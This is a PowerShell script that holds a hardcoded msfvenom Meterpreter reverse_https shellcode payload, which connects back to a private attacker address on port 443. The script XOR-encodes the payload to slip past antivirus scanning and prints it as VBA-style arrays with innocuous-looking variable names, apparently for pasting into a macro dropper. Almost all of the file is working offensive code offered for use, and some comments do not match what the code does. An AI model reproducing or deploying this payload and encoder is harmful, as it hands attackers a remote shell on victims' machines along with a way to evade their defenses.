function Get-RandomBytes($Size) {
    $rb = [Byte[]]::new($Size)
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($rb)
    return $rb
}

function Format-ByteArrayToInt($Bytes, $VarName) {
    $element = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) 
    {
        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) 
        {
            # If this is the last byte don't append a comma
            $element += $b
        } 
        Else 
        {
            $element += "{0}," -f $b
        }
        
        # Let's keep the output clean so only 15 bytes are in a row
        if (($count + 1) % 49 -eq 0)
        {
            $element += " _{0}" -f "`n"
        }
    }
    # Output the elements into a format we can just copy/paste for later use
    $formatted = '{0} = Array({1})' -f $VarName, $element  
    return $formatted
}

# Generate a random shift value
#$sKey = 1..254 | Get-Random

# Generate a random byte to XOR our shellcode with
$xKey = "coldpizza"

# msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f csharp -v payload
[Byte[]] $payload = 0xfc,0xe8,0x8f,0x00,0x00,
0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,
0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,
0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,
0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,
0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,
0xd0,0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,
0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,
0xc1,0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,
0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,
0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,
0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,
0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,
0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,
0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x31,0x54,0x68,0x02,0x00,0x01,
0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,
0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,
0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,
0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,
0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,
0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,
0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,
0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,
0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,
0x75,0xc1,0xc3,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,
0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5

# Encrypt by shifting to the right (+) but you can go in either direction to start then encrypt with XOR
[Byte[]]$encBytes = @();
for ($i = 0; $i -lt $payload.Count; $i++) {
    $encBytes += (($payload[$i] -bxor $xKey[0]) -band 0xFF)
} 

# Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
[Byte[]]$decBytes = @();
for ($i = 0; $i -lt $encBytes.Count; $i++) {
    $decBytes += (($encBytes[$i] -bxor $xKey[0])-band 0xFF)
}

# Format our byte array into a variable format we can use later
$raw = Format-ByteArrayToInt -Bytes $payload -VarName Buy
$enc = Format-ByteArrayToInt -Bytes $encBytes -VarName The
$dec = Format-ByteArrayToInt -Bytes $decBytes -VarName Dip

# Print results
#Write-Host "[*] Shift Key:"
#Write-Host $sKey

Write-Host "`n[*] XOR Key:"
Write-Host $xKey

Write-Host "`n[*] Raw Bytes:"
Write-Host $raw

Write-Host "`n[*] Encrypted Bytes"
Write-Host $enc

Write-Host "`n[*] Decrypted Bytes"
Write-Host $dec